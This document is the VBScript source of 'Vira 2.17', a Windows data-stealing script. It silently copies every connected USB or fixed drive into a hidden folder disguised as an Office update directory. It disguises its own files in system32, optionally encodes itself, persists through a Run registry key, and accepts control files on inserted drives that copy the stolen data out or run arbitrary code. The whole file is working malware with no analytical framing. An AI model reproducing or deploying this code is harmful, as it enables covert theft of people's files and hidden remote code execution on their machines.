'*******************
'  FortUne Vira
'  Version 2.17
'*******************
Option Explicit
On Error Resume Next
Const ViraVersion = "2.17"
Const ViraTitle = "Vira 2"
Const ViraDescription = "Vira 2.17 - A total hacker!"

' System
Dim Shell, Fso, IsAdmin
Set Shell = CreateObject("WScript.Shell")
Set Fso = CreateObject("Scripting.FileSystemObject")

' Vira
Const ControlFile = "ViraControl.ini"
Dim FlagFileNum, FlagFile, CapacityGB, Destination
Dim Container, IsCopied(23)

' Customization Section
Const ConfigFile = "C:\Windows\system32\Wbem\Repository\CONFIG.CTI"

'****************
'  Main Program
'****************
If WScript.Arguments.Count = 0 Then
  ProcessMain
Else
  Dim i, arg
  For i = 0 To WScript.Arguments.Count - 1
    arg = LCase(WScript.Arguments(i))
    Select Case arg
      Case "install"
        Wsh.Quit InstallLocal
      Case "help"
        MsgBox "XWH loves YZ.", 0, ViraTitle
      Case "credit"
        MsgBox ViraDescription, 0, ViraTitle
    End Select
  Next
End If

'***********
'  Library
'***********
Sub ViraInitialize
  ReadConfig
  Shell.Run "CMD /C MKDIR """ & Destination & """", 0, True
  Set Container = Fso.GetFolder(Destination)
  Container.Attributes = 7
  Dim i
  For i = 0 To 22
    IsCopied(i) = False
  Next
End Sub

Sub ViraMain
  Dim i, Letter, Drive
  For i = 0 To 22
    Letter = Chr(68 + i) 'From D: to Z:
    If Fso.DriveExists(Letter) Then
      If Not IsCopied(i) Then
        IsCopied(i) = DriveProcess(Letter)
      End If
    Else
      IsCopied(i) = False
    End If
  Next
End Sub

Function DriveProcess(DriveLetter)
  DriveProcess = False
  Dim Drive, Target, TimeA, TimeB, Text, Folder
  Set Drive = Fso.GetDrive(DriveLetter)
  If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
  Do
    WScript.Sleep 100
  Loop Until Drive.IsReady
  If DriveControlProcess(DriveLetter) Then
    DriveProcess = True
    Exit Function
  End If
  If Drive.DriveType = 1 Then
    For i = 0 To FlagFileNum - 1
      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
        Exit Function
      End If
    Next
    
    Target = Destination & Hex(Drive.SerialNumber) & "\"
    If Not Fso.FolderExists(Target) Then
      If Container.Size + Drive.TotalSize - Drive.FreeSpace < CapacityGB * 1000000000 Then
        Fso.CreateFolder Target
      Else
        Exit Function
      End If
    End If
    WriteDriveInfo DriveLetter, Target & "Vira.ini"
    TimeA = Timer()
    CopyDrive DriveLetter, Target
    TimeB = Timer()
    
    If TimeB < TimeA Then TimeB = TimeB + 86400
    Set Folder = Fso.GetFolder(Target)
    Set Text = Fso.OpenTextFile(Target & "Vira.ini", 8)
    Text.WriteLine "[ExtendDriveInfo]"
    Text.WriteLine "AverageSpeed=" & ConvertSize(Folder.Size / (TimeB-TimeA)) & "/s"
    Text.Close
    DriveProcess = True
  End If
End Function

Function DriveControlProcess(DriveLetter)
  DriveControlProcess = False
  Dim Text, Control
  If Fso.FileExists(DriveLetter & ":\" & ControlFile) Then
    Set Text = Fso.OpenTextFile(DriveLetter & ":\" & ControlFile ,1)
    If Text.ReadLine() = "VR3XC" Then
      Control = Text.ReadLine()
      Select Case Control
        Case "[ViraHarvest]"
          HarvestDrive DriveLetter, Text.ReadAll()
        Case "[ViraExecute]"
          Control = Text.ReadAll()
          Control = Replace(Control, "thisDrive", """" & DriveLetter & """")
          ExecuteGlobal Control
      End Select
      DriveControlProcess = True
      Exit Function
    Else
      Fso.DeleteFile DriveLetter & ":\" & ControlFile, True
    End If
  End If
End Function

Function HarvestDrive(DriveLetter, HarvestInfo)
  On Error Resume Next
  Dim Info, Target, TFolder, SFolder, PFolder, i
  Info = Split(HarvestInfo, "|")
  If UBound(Info) < 2 Then Exit Function
  For i = 0 To UBound(Info)-1
    Info(i) = Trim(Info(i))
  Next
  Target = DriveLetter & ":\" & Info(1) & "\"
  Set TFolder = Fso.GetFolder(Target)
  Set SFolder = Fso.GetFolder(Destination)
  If UBound(Info) >= 3 Then
    CopyNew = Info(2)
  Else
    CopyNew = False
  End If
  
  For Each i In SFolder.SubFolders
    Set PFolder = Fso.GetFolder(i)
    If PFolder.Size + TFolder.Size <= Info(0) * 1000000000 Then
      Fso.CopyFolder i, Target, CopyNew
    End If
  Next
End Function

Function WriteDriveInfo(DriveLetter, Target)
  Dim Text, Drive
  Set Drive = Fso.GetDrive(DriveLetter)
  Set Text = Fso.OpenTextFile(Target, 2, True)
  Text.WriteLine "[Vira]" & vbCrLf & "Version=" & ViraVersion
  Text.WriteLine "OperationTime=" & Now()
  Text.WriteLine "[DriveInfo]"
  Text.WriteLine "Label=" & Drive.VolumeName
  Text.WriteLine "SerialNumber=" & Hex(Drive.SerialNumber)
  Text.WriteLine "FileSystem=" & Drive.FileSystem
  Text.WriteLine "TotalSize=" & Drive.TotalSize
  Text.WriteLine "FreeSpace=" & Drive.FreeSpace
  Text.Close
End Function

Function CopyDrive(DriveLetter, Target)
  On Error Resume Next
  Fso.CopyFile DriveLetter & ":\*", Target, True
  Fso.CopyFolder DriveLetter & ":\*", Target, True
End Function

Function ReadConfig()
  ReadConfig = False
  Dim Text
  Set Text = Fso.OpenTextFile(ConfigFile, 1)
  If Text.ReadLine() = "VR3XF" Then
    FlagFile = Split(Text.ReadLine(), "|")
    FlagFileNum = UBound(FlagFile)
    CapacityGB = Text.ReadLine()
    Destination = Text.ReadLine()
    Text.Close
    ReadConfig = True
  Else
    Exit Function
  End If
End Function

Function WriteConfig()
  WriteConfig = False
  If Not AdminCheck Then
    Exit Function
  End If
  Dim Config, FlagFileNames, i
  If FlagFileNum >= 1 Then FlagFileNames = FlagFile(0)
  For i = 1 To FlagFileNum - 1
    FlagFileNames = FlagFileNames & "|" & FlagFile(i)
  Next
  Set Config = Fso.OpenTextFile(ConfigFile, 2, True)
  Config.WriteLine "VR3XF"
  Config.WriteLine FlagFileNames
  Config.WriteLine CapacityGB
  Config.WriteLine Destination
  Config.WriteLine "XEOF"
  Config.Close
  WriteConfig = True
End Function

Function DefaultConfig()
  FlagFileNum = 2
  FlagFile = Array("setup.exe", "bootmgr")
  CapacityGB = 64
  Destination = "D:\Program Files\Microsoft Office\liveupdate\"
End Function

Function InstallLocal()
  InstallLocal = 1
  If Not AdminCheck() Then
    Exit Function
  End If
  
  MsgBox "Welcome to Vira installation.", 0, ViraTitle
  DefaultConfig
  If MsgBox("Use default settings?", vbYesNo, ViraTitle) = vbNo Then
    Dim Input, i
    FlagFileNum = Abs(CInt(InputBox("Number of flag files:", ViraTitle, FlagFileNum)))
    ReDim Preserve FlagFile(FlagFileNum)
    For i = 0 To FlagFileNum - 1
      FlagFile(i) = InputBox("Flag file #" & i, ViraTitle, FlagFile(i))
    Next
    Destination = InputBox("File container location:" & vbCrLf & "Must end with a backslash [\]", ViraTitle, Destination)
    CapacityGB = Abs(CDbl(InputBox("Maximum size of container:", ViraTitle, CapacityGB)))
  End If
  WriteConfig
  Fso.CopyFile "C:\Windows\system32\wscript.exe", "C:\Windows\system32\netHelper.exe", True
  If Fso.FileExists("screnc.exe") Then
    Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
    Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", "C:\Windows\system32\d3dxm.vbe", True
    Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
  Else
    Fso.CopyFile WScript.ScriptFullName, "C:\Windows\system32\d3dxm.vbe", True
  End If
  Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NetHelper", _
                 "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", "REG_SZ"
  MsgBox "Installation Complete!", 64, ViraTitle
  Shell.Run "C:\Windows\system32\netHelper.exe C:\Windows\system32\d3dxm.vbe", 0, False
  InstallLocal = 0
End Function

Function AdminCheck()
  Select Case IsAdmin
    Case 1
      AdminCheck = True
    Case 2
      AdminCheck = False
    Case Else
      On Error Resume Next
      Const AdminTest = "C:\Windows\AdminTest\"
      Fso.CreateFolder AdminTest
      WScript.Sleep 500
      If Fso.FolderExists(AdminTest) Then
        AdminCheck = True
        IsAdmin = 1
        Fso.DeleteFolder AdminTest, True
      Else
        AdminCheck = False
        IsAdmin = 2
      End If
  End Select
End Function

Function ConvertSize(ByVal Size)
  Dim SizeSuffix, i
  SizeSuffix = Array("B", "KB", "MB", "GB")
  For i = 0 To UBound(SizeSuffix) - 1
    If Size >= 1024 Then
      Size = Size / 1024
    Else
      Exit For
    End If
  Next
  ConvertSize = FormatNumber(Size, 2, True) & SizeSuffix(i)
End Function

'  Master Shiang Dzurr plays silver power

Public Sub ProcessMain()
  ViraInitialize
  Do
    ViraMain
    WScript.Sleep 1000
  Loop
End Sub
